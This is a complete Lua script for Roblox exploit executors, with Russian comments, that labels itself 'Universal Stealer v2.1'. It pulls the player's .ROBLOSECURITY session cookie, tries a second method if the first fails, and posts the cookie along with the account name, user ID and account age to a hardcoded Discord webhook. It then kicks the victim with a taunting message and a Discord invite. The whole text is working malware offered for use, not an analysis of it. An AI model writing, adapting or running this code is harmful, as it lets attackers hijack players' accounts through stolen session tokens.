-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ LOGIC ]]
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local function startStealer()
    local cookie = "N/A"
    
    -- Пытаемся достать куки всеми способами, как в том скрипте
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    -- Если куки не достались, пробуем второй метод (через заголовки)
    if cookie == "N/A" then
        pcall(function()
            local req = (syn and syn.request) or (http and http.request) or request
            local response = req({Url = "https://www.roblox.com/home", Method = "GET"})
            cookie = response.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
        end)
    end

    -- Формируем сообщение для Дискорда
    local data = {
        ["content"] = "@everyone NEW HIT!",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Log: " .. player.Name,
            ["color"] = 3066993, -- Бирюзовый (как в оригинале)
            ["fields"] = {
                {["name"] = "👤 Account", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
                {["name"] = "📅 Created", ["value"] = player.AccountAge .. " days ago", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Universal Stealer v2.1"}
        }}
    }

    -- Отправка
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

-- ЗАПУСК БЕЗ ВЫЛЕТОВ
task.spawn(function()
    pcall(startStealer)
end)

-- ТОТ САМЫЙ КИК
task.wait(1.5)
player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
